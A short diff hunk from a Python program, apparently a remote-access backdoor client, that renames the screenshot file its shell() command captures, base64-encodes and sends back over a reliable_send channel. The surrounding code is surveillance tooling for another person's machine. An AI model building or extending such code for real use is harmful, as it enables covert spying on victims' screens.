@@ -93,9 +93,9 @@ def shell():
         elif command[:10] == "screenshot":
             try: 
                 screenshot()
-                with open("monitor.png", "rb") as f:
+                with open("monitor-1.png", "rb") as f:
                     reliable_send(base64.b64encode(f.read()))
-                os.remove("monitor.png")
+                os.remove("monitor-1.png")
             except: 
                 reliable_send("[-] Failed to take screenshot!")
         else:
